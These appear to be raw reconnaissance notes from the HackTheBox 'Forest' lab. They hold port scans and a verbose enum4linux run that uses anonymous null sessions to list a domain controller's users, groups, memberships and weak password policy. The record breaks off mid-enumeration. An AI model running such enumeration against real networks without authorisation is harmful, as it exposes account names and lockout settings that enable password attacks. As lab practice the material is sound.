Forrest IP:10.10.10.161



rustscan:
PORT      STATE SERVICE        REASON
53/tcp    open  domain         syn-ack
88/tcp    open  kerberos-sec   syn-ack
135/tcp   open  msrpc          syn-ack
139/tcp   open  netbios-ssn    syn-ack
389/tcp   open  ldap           syn-ack
445/tcp   open  microsoft-ds   syn-ack
464/tcp   open  kpasswd5       syn-ack
593/tcp   open  http-rpc-epmap syn-ack
5985/tcp  open  wsman          syn-ack
9389/tcp  open  adws           syn-ack
47001/tcp open  winrm          syn-ack
49664/tcp open  unknown        syn-ack
49665/tcp open  unknown        syn-ack
49666/tcp open  unknown        syn-ack
49667/tcp open  unknown        syn-ack
49671/tcp open  unknown        syn-ack
49676/tcp open  unknown        syn-ack
49677/tcp open  unknown        syn-ack
49684/tcp open  unknown        syn-ack
49706/tcp open  unknown        syn-ack


nmap:

PORT      STATE SERVICE      REASON  VERSION
53/tcp    open  domain       syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec syn-ack Microsoft Windows Kerberos (server time: 2023-02-10 09:33:04Z)
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds syn-ack Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?    syn-ack
593/tcp   open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
5985/tcp  open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       syn-ack .NET Message Framing
47001/tcp open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        syn-ack Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack Microsoft Windows RPC
49684/tcp open  msrpc        syn-ack Microsoft Windows RPC
49706/tcp open  msrpc        syn-ack Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h46m51s, deviation: 4h37m10s, median: 6m49s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 3510/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 32753/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 17449/udp): CLEAN (Timeout)
|   Check 4 (port 44587/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2023-02-10T01:33:58-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-02-10T09:33:54
|_  start_date: 2023-02-10T09:27:05




┌──(kali㉿kali)-[~/Practice/HackTheBox/Forrest]
└─$ enum4linux -v 10.10.10.161                                       
[V] Dependent program "nmblookup" found in /usr/bin/nmblookup
[V] Dependent program "net" found in /usr/bin/net
[V] Dependent program "rpcclient" found in /usr/bin/rpcclient
[V] Dependent program "smbclient" found in /usr/bin/smbclient
[V] Dependent program "polenum" found in /usr/bin/polenum
[V] Dependent program "ldapsearch" found in /usr/bin/ldapsearch
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Feb 10 04:28:31 2023

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.10.161
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.10.161    |
 ==================================================== 
[V] Attempting to get domain name with command: nmblookup -A '10.10.10.161'
[E] Can't find workgroup/domain


 ============================================ 
|    Nbtstat Information for 10.10.10.161    |
 ============================================ 
Looking up status of 10.10.10.161
No reply from 10.10.10.161

 ===================================== 
|    Session Check on 10.10.10.161    |
 ===================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
[V] Attempting to make null session using command: smbclient -W '' //'10.10.10.161'/ipc$ -U''%'' -c 'help' 2>&1
[+] Server 10.10.10.161 allows sessions using username '', password ''
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
[+] Got domain/workgroup name: 

 =========================================== 
|    Getting domain SID for 10.10.10.161    |
 =========================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
[V] Attempting to get domain SID with command: rpcclient -W '' -U''%'' 10.10.10.161 -c 'lsaquery' 2>&1
Domain Name: HTB
Domain Sid: S-1-5-21-3072663084-364016917-1341370565
[+] Host is part of a domain (not a workgroup)

 ====================================== 
|    OS information on 10.10.10.161    |
 ====================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.
[V] Attempting to get OS info with command: smbclient -W '' //'10.10.10.161'/ipc$ -U''%'' -c 'q' 2>&1
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.10.10.161 from smbclient: 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.
[V] Attempting to get OS info with command: rpcclient -W '' -U''%'' -c 'srvinfo' '10.10.10.161' 2>&1
[+] Got OS info for 10.10.10.161 from srvinfo:
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

 ============================= 
|    Users on 10.10.10.161    |
 ============================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
[V] Attempting to get userlist with command: rpcclient -W '' -c querydispinfo -U''%'' '10.10.10.161' 2>&1
index: 0x2137 RID: 0x463 acb: 0x00020015 Account: $331000-VK4ADACQNUCA  Name: (null)    Desc: (null)
index: 0xfbc RID: 0x1f4 acb: 0x00000010 Account: Administrator  Name: Administrator     Desc: Built-in account for administering the computer/domain
index: 0x2369 RID: 0x47e acb: 0x00000210 Account: andy  Name: Andy Hislip       Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0x2352 RID: 0x478 acb: 0x00000210 Account: HealthMailbox0659cc1  Name: HealthMailbox-EXCH01-010  Desc: (null)
index: 0x234b RID: 0x471 acb: 0x00000210 Account: HealthMailbox670628e  Name: HealthMailbox-EXCH01-003  Desc: (null)
index: 0x234d RID: 0x473 acb: 0x00000210 Account: HealthMailbox6ded678  Name: HealthMailbox-EXCH01-005  Desc: (null)
index: 0x2351 RID: 0x477 acb: 0x00000210 Account: HealthMailbox7108a4e  Name: HealthMailbox-EXCH01-009  Desc: (null)
index: 0x234e RID: 0x474 acb: 0x00000210 Account: HealthMailbox83d6781  Name: HealthMailbox-EXCH01-006  Desc: (null)
index: 0x234c RID: 0x472 acb: 0x00000210 Account: HealthMailbox968e74d  Name: HealthMailbox-EXCH01-004  Desc: (null)
index: 0x2350 RID: 0x476 acb: 0x00000210 Account: HealthMailboxb01ac64  Name: HealthMailbox-EXCH01-008  Desc: (null)
index: 0x234a RID: 0x470 acb: 0x00000210 Account: HealthMailboxc0a90c9  Name: HealthMailbox-EXCH01-002  Desc: (null)
index: 0x2348 RID: 0x46e acb: 0x00000210 Account: HealthMailboxc3d7722  Name: HealthMailbox-EXCH01-Mailbox-Database-1118319013  Desc: (null)
index: 0x2349 RID: 0x46f acb: 0x00000210 Account: HealthMailboxfc9daad  Name: HealthMailbox-EXCH01-001  Desc: (null)
index: 0x234f RID: 0x475 acb: 0x00000210 Account: HealthMailboxfd87238  Name: HealthMailbox-EXCH01-007  Desc: (null)
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0x2360 RID: 0x47a acb: 0x00000210 Account: lucinda       Name: Lucinda Berger    Desc: (null)
index: 0x236a RID: 0x47f acb: 0x00000210 Account: mark  Name: Mark Brandt       Desc: (null)
index: 0x236b RID: 0x480 acb: 0x00000210 Account: santi Name: Santi Rodriguez   Desc: (null)
index: 0x235c RID: 0x479 acb: 0x00000210 Account: sebastien     Name: Sebastien Caron   Desc: (null)
index: 0x215a RID: 0x468 acb: 0x00020011 Account: SM_1b41c9286325456bb  Name: Microsoft Exchange Migration      Desc: (null)
index: 0x2161 RID: 0x46c acb: 0x00020011 Account: SM_1ffab36a2f5f479cb  Name: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}       Desc: (null)
index: 0x2156 RID: 0x464 acb: 0x00020011 Account: SM_2c8eef0a09b545acb  Name: Microsoft Exchange Approval Assistant     Desc: (null)
index: 0x2159 RID: 0x467 acb: 0x00020011 Account: SM_681f53d4942840e18  Name: Discovery Search Mailbox  Desc: (null)
index: 0x2158 RID: 0x466 acb: 0x00020011 Account: SM_75a538d3025e4db9a  Name: Microsoft Exchange        Desc: (null)
index: 0x215c RID: 0x46a acb: 0x00020011 Account: SM_7c96b981967141ebb  Name: E4E Encryption Store - Active     Desc: (null)
index: 0x215b RID: 0x469 acb: 0x00020011 Account: SM_9b69f1b9d2cc45549  Name: Microsoft Exchange Federation Mailbox     Desc: (null)
index: 0x215d RID: 0x46b acb: 0x00020011 Account: SM_c75ee099d0a64c91b  Name: Microsoft Exchange        Desc: (null)
index: 0x2157 RID: 0x465 acb: 0x00020011 Account: SM_ca8c2ed5bdab4dc9b  Name: Microsoft Exchange        Desc: (null)
index: 0x2365 RID: 0x47b acb: 0x00010210 Account: svc-alfresco  Name: svc-alfresco      Desc: (null)

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
[V] Attempting to get userlist with command: rpcclient -W '' -c enumdomusers -U''%'' '10.10.10.161' 2>&1
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]

 ========================================= 
|    Share Enumeration on 10.10.10.161    |
 ========================================= 
[V] Attempting to get share list using authentication
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.
do_connect: Connection to 10.10.10.161 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.10.161

 ==================================================== 
|    Password Policy Information for 10.10.10.161    |
 ==================================================== 
[V] Attempting to get Password Policy info with command: polenum '':''@'10.10.10.161' 2>&1


[+] Attaching to 10.10.10.161 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.10.10.161)

[+] Trying protocol 445/SMB...

[+] Found domain(s):

        [+] HTB
        [+] Builtin

[+] Password Info for Domain: HTB

        [+] Minimum password length: 7
        [+] Password history length: 24
        [+] Maximum password age: Not Set
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: 1 day 4 minutes 
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.
[V] Attempting to get Password Policy info with command: rpcclient -W '' -U''%'' '10.10.10.161' -c "getdompwinfo" 2>&1

[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 7


 ============================== 
|    Groups on 10.10.10.161    |
 ============================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.
[V] Getting builtin groups with command: rpcclient -W '' -U''%'' '10.10.10.161' -c 'enumalsgroups builtin' 2>&1

[+] Getting builtin groups:
group:[Account Operators] rid:[0x224]
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Administrators] rid:[0x220]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Print Operators] rid:[0x226]
group:[Backup Operators] rid:[0x227]
group:[Replicator] rid:[0x228]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[System Managed Accounts Group] rid:[0x245]
group:[Storage Replica Administrators] rid:[0x246]
group:[Server Operators] rid:[0x225]

[+] Getting builtin group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'RDS Remote Access Servers' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Server Operators' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Account Operators' -W '' -I '10.10.10.161' -U''%'' 2>&1

Group 'Account Operators' (RID: 548) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Incoming Forest Trust Builders' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'IIS_IUSRS' -W '' -I '10.10.10.161' -U''%'' 2>&1

Group 'IIS_IUSRS' (RID: 568) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Performance Monitor Users' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Storage Replica Administrators' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'System Managed Accounts Group' -W '' -I '10.10.10.161' -U''%'' 2>&1

Group 'System Managed Accounts Group' (RID: 581) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Access Control Assistance Operators' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'RDS Management Servers' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Terminal Server License Servers' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Performance Log Users' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Network Configuration Operators' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Administrators' -W '' -I '10.10.10.161' -U''%'' 2>&1

Group 'Administrators' (RID: 544) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Certificate Service DCOM Access' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Distributed COM Users' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Event Log Readers' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Hyper-V Administrators' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Windows Authorization Access Group' -W '' -I '10.10.10.161' -U''%'' 2>&1

Group 'Windows Authorization Access Group' (RID: 560) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'RDS Endpoint Servers' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Cryptographic Operators' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Remote Desktop Users' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Pre-Windows 2000 Compatible Access' -W '' -I '10.10.10.161' -U''%'' 2>&1

Group 'Pre-Windows 2000 Compatible Access' (RID: 554) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Remote Management Users' -W '' -I '10.10.10.161' -U''%'' 2>&1

Group 'Remote Management Users' (RID: 580) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Backup Operators' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Users' -W '' -I '10.10.10.161' -U''%'' 2>&1

Group 'Users' (RID: 545) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Replicator' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Print Operators' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Guests' -W '' -I '10.10.10.161' -U''%'' 2>&1

Group 'Guests' (RID: 546) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.
[V] Getting local groups with command: rpcclient -W '' -U''%'' '10.10.10.161' -c 'enumalsgroups domain' 2>&1

[+] Getting local groups:
group:[Cert Publishers] rid:[0x205]
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44d]

[+] Getting local group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'DnsAdmins' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Cert Publishers' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'RAS and IAS Servers' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Allowed RODC Password Replication Group' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Denied RODC Password Replication Group' -W '' -I '10.10.10.161' -U''%'' 2>&1

Group 'Denied RODC Password Replication Group' (RID: 572) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.
[V] Getting domain groups with command: rpcclient -W '' -U''%'' '10.10.10.161' -c "enumdomgroups" 2>&1

[+] Getting domain groups:
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Organization Management] rid:[0x450]
group:[Recipient Management] rid:[0x451]
group:[View-Only Organization Management] rid:[0x452]
group:[Public Folder Management] rid:[0x453]
group:[UM Management] rid:[0x454]
group:[Help Desk] rid:[0x455]
group:[Records Management] rid:[0x456]
group:[Discovery Management] rid:[0x457]
group:[Server Management] rid:[0x458]
group:[Delegated Setup] rid:[0x459]
group:[Hygiene Management] rid:[0x45a]
group:[Compliance Management] rid:[0x45b]
group:[Security Reader] rid:[0x45c]
group:[Security Administrator] rid:[0x45d]
group:[Exchange Servers] rid:[0x45e]
group:[Exchange Trusted Subsystem] rid:[0x45f]
group:[Managed Availability Servers] rid:[0x460]
group:[Exchange Windows Permissions] rid:[0x461]
group:[ExchangeLegacyInterop] rid:[0x462]
group:[$D31000-NSEL5BRJ63V7] rid:[0x46d]
group:[Service Accounts] rid:[0x47c]
group:[Privileged IT Accounts] rid:[0x47d]
group:[test] rid:[0x13ed]

[+] Getting domain group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Managed Availability Servers' -W '' -I '10.10.10.161' -U''%'' 2>&1

Group 'Managed Availability Servers' (RID: 1120) has member: HTB\EXCH01$
Group 'Managed Availability Servers' (RID: 1120) has member: HTB\Exchange Servers
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Key Admins' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Service Accounts' -W '' -I '10.10.10.161' -U''%'' 2>&1

Group 'Service Accounts' (RID: 1148) has member: HTB\svc-alfresco
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Domain Users' -W '' -I '10.10.10.161' -U''%'' 2>&1

Group 'Domain Users' (RID: 513) has member: HTB\Administrator
Group 'Domain Users' (RID: 513) has member: HTB\DefaultAccount
Group 'Domain Users' (RID: 513) has member: HTB\krbtgt
Group 'Domain Users' (RID: 513) has member: HTB\$331000-VK4ADACQNUCA
Group 'Domain Users' (RID: 513) has member: HTB\SM_2c8eef0a09b545acb
Group 'Domain Users' (RID: 513) has member: HTB\SM_ca8c2ed5bdab4dc9b
Group 'Domain Users' (RID: 513) has member: HTB\SM_75a538d3025e4db9a
Group 'Domain Users' (RID: 513) has member: HTB\SM_681f53d4942840e18
Group 'Domain Users' (RID: 513) has member: HTB\SM_1b41c9286325456bb
Group 'Domain Users' (RID: 513) has member: HTB\SM_9b69f1b9d2cc45549
Group 'Domain Users' (RID: 513) has member: HTB\SM_7c96b981967141ebb
Group 'Domain Users' (RID: 513) has member: HTB\SM_c75ee099d0a64c91b
Group 'Domain Users' (RID: 513) has member: HTB\SM_1ffab36a2f5f479cb
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailboxc3d7722
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailboxfc9daad
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailboxc0a90c9
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailbox670628e
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailbox968e74d
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailbox6ded678
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailbox83d6781
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailboxfd87238
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailboxb01ac64
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailbox7108a4e
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailbox0659cc1
Group 'Domain Users' (RID: 513) has member: HTB\sebastien
Group 'Domain Users' (RID: 513) has member: HTB\lucinda
Group 'Domain Users' (RID: 513) has member: HTB\svc-alfresco
Group 'Domain Users' (RID: 513) has member: HTB\andy
Group 'Domain Users' (RID: 513) has member: HTB\mark
Group 'Domain Users' (RID: 513) has member: HTB\santi
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Security Reader' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'UM Management' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Enterprise Key Admins' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Domain Guests' -W '' -I '10.10.10.161' -U''%'' 2>&1

Group 'Domain Guests' (RID: 514) has member: HTB\Guest
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'View-Only Organization Management' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Compliance Management' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Enterprise Read-only Domain Controllers' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Domain Controllers' -W '' -I '10.10.10.161' -U''%'' 2>&1

Group 'Domain Controllers' (RID: 516) has member: HTB\FOREST$
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Privileged IT Accounts' -W '' -I '10.10.10.161' -U''%'' 2>&1

Group 'Privileged IT Accounts' (RID: 1149) has member: HTB\Service Accounts
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Help Desk' -W '' -I '10.10.10.161' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
